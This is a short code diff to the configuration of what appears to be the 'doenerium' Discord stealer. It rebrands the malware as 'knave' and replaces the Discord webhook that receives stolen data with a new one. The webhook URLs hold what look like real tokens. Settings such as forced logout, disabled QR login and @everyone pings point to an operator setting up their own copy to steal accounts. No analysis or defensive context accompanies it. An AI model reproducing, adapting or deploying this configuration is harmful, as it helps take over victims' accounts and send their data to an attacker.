@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "doenerium",
 
-    webhook: "https://discord.com/api/webhooks/986732629871198299/HbfgOW7Ua0K_f_opSbLGPIAKtBBnOJaSFXTSX0fZHqOF3KEhDnv25_SHF9rD8zM7UGqm",
+    webhook: "https://discord.com/api/webhooks/987081922343739433/8LiashxFAMR5oWLgby-Igm_PyjLHb8N8q8oRwAieODNuSWRofEeZFiy5R57db1b9rDNu",
 
     logout: true,
     disable_qr_code: true,
@@ -23,13 +23,13 @@ var config = {
     ping: [true, "@everyone"],
 
     embed: {
-        username: "doenerium | t.me/doener2323",
+        username: "knave | t.me/knave",
         footer: {
-            text: `doenerium | t.me/doener2323`,
-            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
+            text: `knave | t.me/knave`,
+            icon_url: "https://cdn.discordapp.com/emojis/740932357179179069.webp?size=96&quality=lossless",
         },
-        href: "https://t.me/doener2323",
-        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
+        href: "https://t.me/knave",
+        avatar_url: "https://cdn.discordapp.com/emojis/740932357179179069.webp?size=96&quality=lossless"
     },
 
     badges: {
